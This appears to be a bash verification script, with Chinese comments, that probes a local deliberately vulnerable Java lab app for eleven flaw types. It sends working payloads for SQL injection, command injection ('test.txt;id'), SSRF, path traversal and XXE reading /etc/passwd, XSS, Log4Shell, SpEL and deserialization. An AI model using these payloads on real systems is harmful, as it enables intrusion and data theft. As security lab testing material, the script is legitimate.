#!/bin/bash
# 本地快速验证测试
# 用于快速验证漏洞是否存在，无需完整测试套件

BASE_URL="http://localhost:8080"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "======================================"
echo "本地快速漏洞验证"
echo "目标: $BASE_URL"
echo "======================================"
echo ""

# 检查服务器是否运行
echo -n "检查服务器状态... "
if curl -s -f "$BASE_URL" > /dev/null 2>&1; then
    echo -e "${GREEN}运行中${NC}"
else
    echo -e "${RED}未运行${NC}"
    echo "请先启动服务器: mvn spring-boot:run"
    exit 1
fi

echo ""
echo "=== 快速验证测试 ==="
echo ""

# SQL Injection
echo -n "[1/11] SQL Injection... "
response=$(curl -s "$BASE_URL/sqli/jdbc/vuln?username=admin' OR '1'='1")
if echo "$response" | grep -qi "username:"; then
    echo -e "${GREEN}存在${NC}"
else
    echo -e "${RED}未检测到${NC}"
fi

# MyBatis SQLi
echo -n "[2/11] MyBatis SQLi... "
response=$(curl -s "$BASE_URL/mybatis/vuln01?username=admin' OR '1'='1")
if echo "$response" | grep -qi "results\|username:"; then
    echo -e "${GREEN}存在${NC}"
else
    echo -e "${YELLOW}需要数据库${NC}"
fi

# SSRF
echo -n "[3/11] SSRF (file://)... "
response=$(curl -s "$BASE_URL/ssrf/urlconnection/vuln?url=file:///etc/passwd")
if echo "$response" | grep -qi "root:"; then
    echo -e "${GREEN}存在${NC}"
else
    echo -e "${RED}未检测到${NC}"
fi

# Command Injection
echo -n "[4/11] Command Injection... "
response=$(curl -s "$BASE_URL/cmd/runtime/vuln?filename=test.txt;id")
if echo "$response" | grep -qi "uid="; then
    echo -e "${GREEN}存在${NC}"
else
    echo -e "${RED}未检测到${NC}"
fi

# XSS
echo -n "[5/11] XSS (Reflected)... "
response=$(curl -s "$BASE_URL/xss/reflect?vuln=<script>alert(1)</script>")
if echo "$response" | grep -qi "<script>alert(1)</script>"; then
    echo -e "${GREEN}存在${NC}"
else
    echo -e "${RED}未检测到${NC}"
fi

# Log4Shell
echo -n "[6/11] Log4Shell (env leak)... "
response=$(curl -s "$BASE_URL/log4j/vuln?token=\${env:USER}")
if echo "$response" | grep -vq "Error"; then
    echo -e "${GREEN}存在${NC} (用户: $(echo "$response" | grep -oP '(?<=Token logged: ).*?(?=$|\n)' | head -1))"
else
    echo -e "${YELLOW}需要Log4j 2.14.1${NC}"
fi

# Path Traversal
echo -n "[7/11] Path Traversal... "
response=$(curl -s "$BASE_URL/path/traversal/vuln?filename=../../../../../etc/passwd")
if echo "$response" | grep -qi "root:"; then
    echo -e "${GREEN}存在${NC}"
else
    echo -e "${RED}未检测到${NC}"
fi

# Jackson
echo -n "[8/11] Jackson Deserialize... "
response=$(curl -s -X POST -H "Content-Type: application/json" \
    -d '["java.lang.AutoCloseable"]' \
    "$BASE_URL/deserialize/jackson/vuln")
if echo "$response" | grep -vqi "error"; then
    echo -e "${GREEN}接受payload${NC}"
else
    echo -e "${RED}未检测到${NC}"
fi

# FastJSON
echo -n "[9/11] FastJSON Deserialize... "
response=$(curl -s -X POST -H "Content-Type: application/json" \
    -d '{"@type":"java.lang.AutoCloseable"}' \
    "$BASE_URL/fastjson/deserialize/vuln")
if echo "$response" | grep -vqi "error"; then
    echo -e "${GREEN}接受@type${NC}"
else
    echo -e "${RED}未检测到${NC}"
fi

# SpEL
echo -n "[10/11] SpEL Injection... "
response=$(curl -s "$BASE_URL/spel/vuln1?expression=T(java.lang.System).getProperty('os.name')")
if echo "$response" | grep -qi "linux\|windows"; then
    echo -e "${GREEN}存在${NC}"
else
    echo -e "${RED}未检测到${NC}"
fi

# XXE
echo -n "[11/11] XXE... "
xxe_payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
response=$(curl -s -X POST -H "Content-Type: application/xml" -d "$xxe_payload" \
    "$BASE_URL/xxe/documentbuilder/vuln")
if echo "$response" | grep -qi "root:"; then
    echo -e "${GREEN}存在${NC}"
else
    echo -e "${RED}未检测到${NC}"
fi

echo ""
echo "======================================"
echo "快速验证完成"
echo "======================================"
echo ""
echo "详细测试请运行:"
echo "  python3 validation/scripts/run_validation.py"
echo ""
echo "Payload文件位置: validation/payloads/"
